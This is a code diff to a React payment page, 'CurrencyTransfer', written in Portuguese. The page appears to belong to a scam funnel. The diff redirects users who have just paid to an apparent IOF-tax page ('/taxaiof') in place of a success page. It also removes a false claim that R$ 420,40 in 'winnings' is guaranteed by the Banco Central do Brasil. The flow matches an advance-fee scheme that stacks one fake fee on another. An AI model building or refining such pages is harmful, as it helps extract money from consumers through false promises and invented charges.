@@ -129,7 +129,7 @@ export default function CurrencyTransfer() {
           clearInterval(interval)
           setPaymentApproved(true)
           setTimeout(() => {
-            navigateWithUTM("/success")
+            navigateWithUTM("/taxaiof")
           }, 2000)
         }
       }, 5000)
@@ -475,18 +475,6 @@ export default function CurrencyTransfer() {
                           <span className="text-xs font-bold text-zinc-900 dark:text-zinc-100">Total final</span>
                           <span className="text-sm font-bold text-green-600">R$ 420,40</span>
                         </div>
-                      </div>
-                    </div>
-
-                    <div className="flex items-center gap-2 p-2 border border-zinc-200 dark:border-zinc-700 rounded-md">
-                      <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
-                        <span className="text-white text-xs">✓</span>
-                      </div>
-                      <div>
-                        <p className="text-xs font-medium text-zinc-900 dark:text-zinc-100">Garantia de recebimento</p>
-                        <p className="text-xs text-zinc-600 dark:text-zinc-400">
-                          O valor ganho de R$ 420,40 é garantido pelo Banco Central do Brasil.
-                        </p>
                       </div>
                     </div>
 
